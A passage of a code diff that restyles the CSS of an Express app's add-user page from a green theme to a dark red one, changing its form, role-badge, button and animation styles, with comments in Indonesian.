             overflow: hidden;
         }
@@ -5846,115 +5907,166 @@ app.get("/adduser", requireAuth, (req, res) => {
         .form-container::before {
             content: "";
             position: absolute;
-            top: 0; left: 0; width: 100%; height: 2px;
-            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), var(--accent), transparent);
         }
 
         /* User info info */
         .user-info {
-            background: rgba(255, 255, 255, 0.03);
-            padding: 20px;
-            border-radius: 20px;
+            background: rgba(255, 0, 0, 0.03);
+            padding: 22px;
+            border-radius: 15px;
             margin-bottom: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: 0.4s;
         }
         
         .user-info:hover {
             border-color: var(--primary);
-            background: rgba(50, 205, 50, 0.02);
+            background: rgba(255, 0, 0, 0.07);
+            transform: translateX(5px);
         }
 
         .info-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-size: 13px;
         }
 
         .info-label {
-            color: #777;
-            font-weight: 400;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .info-value {
-            color: #fff;
-            font-weight: 600;
+            color: #efefef;
+            font-weight: 700;
             font-family: 'Rajdhani', sans-serif;
-            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255,255,255,0.2);
         }
 
-        /* Role Badges */
+        /* Role Badges - High Contrast */
         .role-badge {
             display: inline-block;
-            padding: 5px 15px;
-            border-radius: 8px;
+            padding: 6px 16px;
+            border-radius: 4px;
             font-size: 10px;
-            font-weight: 700;
+            font-weight: 800;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            letter-spacing: 2px;
         }
 
-        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
-        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
-        .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; box-shadow: 0 0 15px rgba(50, 205, 50, 0.3); }
-        .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }
+        .role-owner { background: #fff; color: #000; box-shadow: 0 0 20px #fff; }
+        .role-admin { background: var(--primary); color: #fff; box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
+        .role-reseller { background: #333; color: #fff; border: 1px solid #444; }
+        .role-user { border: 1px solid var(--primary); color: var(--primary); }
 
-        /* Form Controls */
+        /* Perbaikan Form Controls - Custom Style Dark Red */
         .form-group { margin-bottom: 25px; }
 
         label {
             display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-            color: #aaa;
-            font-size: 12px;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
+            letter-spacing: 2px;
         }
 
         label i { color: var(--primary); margin-right: 8px; }
 
+        /* Customizing Input & Select */
         input, select {
             width: 100%;
             padding: 16px 20px;
-            border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.08);
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            background: linear-gradient(145deg, #120000, #0a0a0a);
+            color: #ffffff;
             font-size: 14px;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             outline: none;
+            appearance: none; /* Menghilangkan arrow default browser */
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            cursor: pointer;
+            position: relative;
+        }
+
+        /* Styling Select supaya benar-benar Custom */
+        select {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            background-color: #0f0000; /* Hitam kemerahan */
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+            outline: none;
+            
+            /* RESET DEFAULT BROWSER */
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            
+            /* Custom Arrow (SVG Merah) */
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23ff0000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 16px;
         }
 
         input:focus, select:focus {
-            background: rgba(255, 255, 255, 0.08);
-            border-color: var(--primary);
-            box-shadow: 0 0 20px rgba(50, 205, 50, 0.2);
-            transform: scale(1.02);
+            border-color: #ff0000;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+            background-color: #1a0000;
         }
 
-        /* Buttons */
+        /* INI KUNCINYA: Styling Option agar tidak Biru */
+        select option {
+            background: #150000; /* Warna dropdown list jadi merah gelap */
+            color: #fff;
+            padding: 15px;
+        }
+
+        /* Khusus Firefox & Chrome untuk menghilangkan highlight biru */
+        select:-moz-focusring {
+            color: transparent;
+            text-shadow: 0 0 0 #fff;
+        }
+
+        /* Hover pada option (hanya berpengaruh pada browser tertentu) */
+        select option:hover, 
+        select option:focus, 
+        select option:active {
+            background-color: var(--primary) !important;
+            background: var(--primary) !important;
+        }
+
+        /* Buttons - Aggressive Red Gradient */
         .button-group {
             display: flex;
             gap: 15px;
-            margin-top: 35px;
+            margin-top: 40px;
         }
 
         .btn {
             flex: 1;
-            padding: 18px;
+            padding: 20px;
             border: none;
-            border-radius: 15px;
-            font-weight: 700;
+            border-radius: 12px;
+            font-weight: 800;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             font-family: 'Orbitron', sans-serif;
-            font-size: 11px;
+            font-size: 12px;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
             text-align: center;
             text-decoration: none;
             display: flex;
@@ -5964,67 +6076,66 @@ app.get("/adduser", requireAuth, (req, res) => {
         }
 
         .btn-save {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            background: linear-gradient(45deg, #ff0000, #4a0000);
             color: #fff;
-            box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
+            box-shadow: 0 15px 35px rgba(255, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .btn-save:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
-            filter: brightness(1.1);
+            transform: scale(1.05);
+            box-shadow: 0 20px 45px rgba(255, 0, 0, 0.5);
+            filter: brightness(1.2);
         }
 
         .btn-back {
-            background: rgba(255, 255, 255, 0.05);
+            background: transparent;
             color: #fff;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid #333;
         }
         
         .btn-back:hover {
-            background: rgba(255, 255, 255, 0.1);
-            border-color: #fff;
+            background: #fff;
+            color: #000;
             transform: translateY(-3px);
         }
 
         /* Info Boxes */
         .permission-info {
-            background: rgba(50, 205, 50, 0.05);
-            padding: 15px;
-            border-radius: 15px;
-            font-size: 12px;
-            color: var(--primary);
+            background: rgba(255, 0, 0, 0.1);
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 11px;
+            color: var(--accent);
             text-align: center;
-            margin-top: 25px;
-            border: 1px solid rgba(50, 205, 50, 0.2);
+            margin-top: 30px;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .permission-note {
-            background: rgba(255, 255, 255, 0.02);
-            padding: 15px;
-            border-radius: 15px;
-            font-size: 11px;
-            color: #666;
+            font-size: 10px;
+            color: #444;
             text-align: center;
-            margin-top: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
-            line-height: 1.6;
+            margin-top: 25px;
+            line-height: 1.8;
         }
 
         /* Animations */
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(40px); filter: blur(10px); }
+            to { opacity: 1; transform: translateY(0); filter: blur(0); }
         }
 
         .form-container { 
-            animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
+            animation: fadeInUp 1s cubic-bezier(0.19, 1, 0.22, 1); 
         }
 
         @media (max-width: 500px) {
-            body { padding: 20px 15px; }
-            .form-container { padding: 30px 20px; }
-            .header h2 { font-size: 22px; }
+            body { padding: 20px 10px; }
+            .form-container { padding: 30px 15px; border-radius: 20px; }
+            .header h2 { font-size: 24px; letter-spacing: 3px; }
             .button-group { flex-direction: column; }
         }
     </style>
@@ -6106,8 +6217,9 @@ app.get("/adduser", requireAuth, (req, res) => {
     <script>
         $(document).ready(function() {
             $('#particles').particleground({
-                dotColor: '#1a4a1a', /* Sesuai tema hijau */
-                lineColor: '#1a4a1a',
+                /* Konfigurasi Partikel - Cyber Red */
+                dotColor: '#4a1a1a', /* Merah gelap transparan */
+                lineColor: '#4a1a1a', /* Merah gelap transparan */
                 minSpeedX: 0.1,
                 maxSpeedX: 0.4,
                 density: 10000,
